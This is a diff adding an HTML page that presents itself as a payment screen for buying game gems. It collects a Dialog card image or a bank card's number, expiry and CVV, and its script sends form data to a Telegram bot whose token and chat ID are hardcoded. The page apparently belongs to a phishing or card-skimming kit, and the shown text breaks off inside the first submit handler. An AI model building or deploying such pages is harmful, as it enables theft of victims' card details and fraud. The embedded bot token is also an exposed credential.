@@ -1,0 +1,195 @@
+<!-- Save as payment_method.html -->
+<!DOCTYPE html>
+<html lang="si">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Payment Method</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@600&display=swap');
+    body, html {
+      margin:0; padding:0; height:100%;
+      font-family: 'Poppins', sans-serif;
+      background: url('https://drive.google.com/uc?export=view&id=1eEBi18oLyR-ps1Y7fGUgl9DoNAJQzvVT') no-repeat center center fixed;
+      background-size: cover;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+    h1 {
+      margin-top: 20px;
+      margin-bottom: 30px;
+      font-size: 2.5rem;
+      color: #ffd700;
+      text-shadow: 1px 1px 4px #000;
+    }
+    .payment-options {
+      display: flex;
+      gap: 25px;
+      margin-bottom: 30px;
+    }
+    .payment-option {
+      padding: 20px 30px;
+      background: rgba(0,0,0,0.6);
+      border-radius: 15px;
+      cursor: pointer;
+      box-shadow: 0 0 15px #ffd70088;
+      font-weight: 700;
+      font-size: 1.2rem;
+      user-select: none;
+      transition: transform 0.3s ease;
+    }
+    .payment-option:hover {
+      transform: scale(1.05);
+    }
+    .payment-option.selected {
+      background: #ffd700;
+      color: #000;
+      box-shadow: 0 0 25px #ffff0055;
+      transform: scale(1.1);
+    }
+
+    .form-section {
+      width: 100%;
+      max-width: 450px;
+      background: rgba(0,0,0,0.5);
+      border-radius: 15px;
+      padding: 20px;
+      box-sizing: border-box;
+      display: none;
+      flex-direction: column;
+      gap: 15px;
+      color: #000;
+      box-shadow: 0 0 15px #ffdd0055;
+    }
+
+    .form-section.active {
+      display: flex;
+    }
+
+    label {
+      font-weight: 600;
+      font-size: 1.1rem;
+      color: #222;
+    }
+    input[type="text"], input[type="file"], input[type="number"] {
+      padding: 10px;
+      border-radius: 8px;
+      border: 1.5px solid #aaa;
+      font-size: 1rem;
+      outline: none;
+      width: 100%;
+      box-sizing: border-box;
+    }
+    button#confirmPayment {
+      margin-top: 20px;
+      width: 100%;
+      padding: 15px;
+      background-color: #ffcc00;
+      border: none;
+      border-radius: 15px;
+      font-size: 1.3rem;
+      font-weight: 700;
+      cursor: pointer;
+      color: #000;
+      box-shadow: 0 0 20px #ffcc0077;
+      user-select: none;
+    }
+  </style>
+</head>
+<body>
+  <h1>Select Payment Method</h1>
+  <div class="payment-options">
+    <div class="payment-option" id="dialogCardBtn">Dialog Card</div>
+    <div class="payment-option" id="bankCardBtn">Bank Card</div>
+  </div>
+
+  <!-- Dialog Card form -->
+  <form id="dialogCardForm" class="form-section" enctype="multipart/form-data">
+    <label for="dialogCardImage">Upload Dialog Card Image</label>
+    <input type="file" id="dialogCardImage" name="dialogCardImage" accept="image/*" required />
+    <button type="submit" id="confirmPayment">Confirm & Pay</button>
+  </form>
+
+  <!-- Bank Card form -->
+  <form id="bankCardForm" class="form-section">
+    <label for="cardNumber">Card Number</label>
+    <input type="text" id="cardNumber" name="cardNumber" maxlength="16" pattern="\d{16}" placeholder="1234 5678 9012 3456" required />
+
+    <label for="expiry">Expiry MM/YY</label>
+    <input type="text" id="expiry" name="expiry" pattern="(0[1-9]|1[0-2])\/\d{2}" placeholder="MM/YY" required />
+
+    <label for="cvv">CVV</label>
+    <input type="number" id="cvv" name="cvv" maxlength="3" min="0" max="999" placeholder="123" required />
+
+    <button type="submit" id="confirmPaymentBank">Confirm & Pay</button>
+  </form>
+
+  <script>
+    const dialogCardBtn = document.getElementById('dialogCardBtn');
+    const bankCardBtn = document.getElementById('bankCardBtn');
+    const dialogCardForm = document.getElementById('dialogCardForm');
+    const bankCardForm = document.getElementById('bankCardForm');
+
+    dialogCardBtn.addEventListener('click', () => {
+      dialogCardBtn.classList.add('selected');
+      bankCardBtn.classList.remove('selected');
+      dialogCardForm.classList.add('active');
+      bankCardForm.classList.remove('active');
+    });
+
+    bankCardBtn.addEventListener('click', () => {
+      bankCardBtn.classList.add('selected');
+      dialogCardBtn.classList.remove('selected');
+      bankCardForm.classList.add('active');
+      dialogCardForm.classList.remove('active');
+    });
+
+    // By default select none
+    // But let's select Dialog Card by default
+    dialogCardBtn.click();
+
+    // Telegram Bot credentials
+    const telegramBotToken = '8302191566:AAEHqG1RjiUrIlYJ3YEEzV2-R4XKr-3JA08';
+    const telegramChatId = '@myslfree_bot'; // user provided, but typically need chat id number, adjust if needed
+
+    // Get stored data from previous pages
+    const gameID = sessionStorage.getItem('gameID') || '';
+    const userName = sessionStorage.getItem('userName') || '';
+    const jemAmount = sessionStorage.getItem('jemAmount') || '';
+    const jemCount = sessionStorage.getItem('jemCount') || '';
+
+    // Utility function to send message to Telegram via Bot API
+    async function sendTelegramMessage(message) {
+      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+      const data = {
+        chat_id: telegramChatId,
+        text: message,
+        parse_mode: 'HTML'
+      };
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify(data)
+        });
+        const resJson = await response.json();
+        if (!resJson.ok) {
+          alert('Telegram API error: ' + resJson.description);
+        }
+        return resJson;
+      } catch (error) {
+        alert('Failed to send data to Telegram. ' + error);
+      }
+    }
+
+    // For Dialog Card form submission
+    dialogCardForm.addEventListener('submit', async function(e){
+      e.preventDefault();
+
+      const fileInput = dialogCardForm.dialogCardImage;
+      if(fileInput.files.length === 0){
+        alert('කරුණ
